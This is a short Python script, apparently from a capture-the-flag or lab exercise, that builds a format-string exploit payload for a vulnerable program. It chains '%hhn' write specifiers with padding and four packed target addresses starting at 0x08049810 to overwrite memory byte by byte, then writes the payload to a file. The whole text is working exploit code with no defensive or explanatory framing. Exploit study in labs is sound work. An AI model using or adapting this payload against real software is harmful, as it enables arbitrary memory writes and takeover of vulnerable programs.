import struct

# Assume these values are found through your analysis
var_address = 0x08049810

# Create the payload
payload = b" "
payload += b"%44$hhn"
payload += b" "
payload += b"%43$hhn"
payload += b" " * (0x44 - 0x2)
payload += b"%41$hhn"
payload += b" " * (0x55 - 0x44)
payload += b"%42$hhn   "
payload += struct.pack('I', var_address)
payload += struct.pack('I', var_address + 1)
payload += struct.pack('I', var_address + 2)
payload += struct.pack('I', var_address + 3)


# Save the payload to a file or pass it directly to the vulnerable program
with open('payload', 'wb') as f:
    f.write(payload)

